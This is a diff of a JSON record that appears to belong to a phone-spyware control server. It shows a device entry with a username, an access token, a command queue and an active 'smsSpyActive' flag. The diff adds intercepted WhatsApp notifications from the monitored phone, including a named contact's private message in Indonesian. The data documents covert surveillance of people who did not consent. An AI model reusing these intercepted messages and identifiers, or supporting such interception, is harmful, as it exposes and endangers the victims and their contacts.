@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776850655129,
+    "lastSeen": 1776850661236,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎56 pesan dari 35 chat",
+        "time": "22/04 17:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776850663347
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "sumpah bentar aku ngantuk banget pusing",
+        "time": "22/04 17:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776850663224
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎55 pesan dari 34 chat",
+        "time": "22/04 17:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776850656717
+      },
       {
         "appName": "WhatsApp",
         "sender": "Dedy Hk",
